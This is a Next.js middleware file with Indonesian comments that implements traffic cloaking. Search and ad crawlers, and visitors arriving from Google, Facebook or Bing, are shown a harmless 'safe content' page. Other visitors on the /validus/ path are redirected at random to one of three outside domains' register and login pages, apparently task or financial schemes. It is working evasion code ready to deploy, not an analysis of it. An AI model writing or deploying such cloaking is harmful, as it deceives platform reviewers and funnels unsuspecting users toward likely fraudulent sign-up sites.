import { NextResponse } from 'next/server';

// ===============================================
// 1. KONFIGURASI KHUSUS ANDA
// ===============================================

// JALUR UTAMA YANG MENGAKTIFKAN PENGALIHAN
const ACTIVE_REDIRECT_PATH = '/validus/'; 

// URL TARGET ACARA (3 Domain Dasar, TIDAK termasuk path)
const TARGET_DOMAINS = [
    "https://ventureidven.com",
    "https://akunfinansial.com",
    "https://platformtugas.com"
];

// USER AGENT BOT/CRAWLER
const BOT_AGENTS = ["googlebot", "bingbot", "yahoo! slurp", "adsbot", "facebookexternalhit"];
const SUSPICIOUS_REFERERS = ["google.com", "facebook.com", "bing.com"];


export default function middleware(request) {
    const url = new URL(request.url);
    const pathname = url.pathname.toLowerCase();
    const userAgent = request.headers.get('user-agent')?.toLowerCase() || '';
    const referer = request.headers.get('referer')?.toLowerCase() || '';

    let isBot = false;
    // Pengecekan Bot
    for (const bot of BOT_AGENTS) {
        if (userAgent.includes(bot)) { isBot = true; break; }
    }
    for (const ref of SUSPICIOUS_REFERERS) {
        if (referer.includes(ref)) { isBot = true; break; }
    }

    // Pengecekan Path
    const isCorrectBasePath = pathname.startsWith(ACTIVE_REDIRECT_PATH);

    // ===============================================
    // 3. EKSEKUSI
    // ===============================================
    
    // KONDISI 1: JALUR BENAR DAN BUKAN BOT (HUMAN)
    if (isCorrectBasePath && !isBot) {
        
        // 1. Pilih Domain Dasar Secara Acak
        const randomIndex = Math.floor(Math.random() * TARGET_DOMAINS.length);
        const randomBaseDomain = TARGET_DOMAINS[randomIndex];

        // 2. Ambil Sisa Path TEPAT setelah '/validus'
        // Contoh: '/validus/daftar' -> '/daftar'
        let remainingPath = pathname.substring(ACTIVE_REDIRECT_PATH.length);

        // Pastikan remainingPath dimulai dengan '/' jika belum ada, untuk menjaga konsistensi.
        if (remainingPath && !remainingPath.startsWith('/')) {
            remainingPath = '/' + remainingPath;
        }

        // 3. Tentukan Path Tujuan Sebenarnya (Mapping)
        let targetPath = '';

        if (remainingPath === 'daftar' || remainingPath === '/daftar') {
            targetPath = '/index/user/register';
        } else if (remainingPath === 'home' || remainingPath === '/home') {
            targetPath = '/index/my/index';
        } else if (remainingPath === 'login' || remainingPath === '/login') {
            targetPath = '/index/user/login';
        } 
        // Jika hanya /validus/ atau path lain yang tidak terdaftar, arahkan ke root '/'
        else {
            targetPath = '/';
        }

        // 4. Gabungkan Domain Dasar + Path Tujuan
        const finalRedirectUrl = randomBaseDomain + targetPath;

        // Lakukan Pengalihan 302
        return NextResponse.redirect(finalRedirectUrl, 302);
    } 
    
    // KONDISI 2: JALUR SALAH ATAU TERDETEKSI BOT
    // Tampilkan Konten Aman
    return NextResponse.rewrite(new URL('/index.html', url)); 
}

// Konfigurasi agar Middleware berjalan di SEMUA PATH
export const config = {
    matcher: ['/:path*'],
};
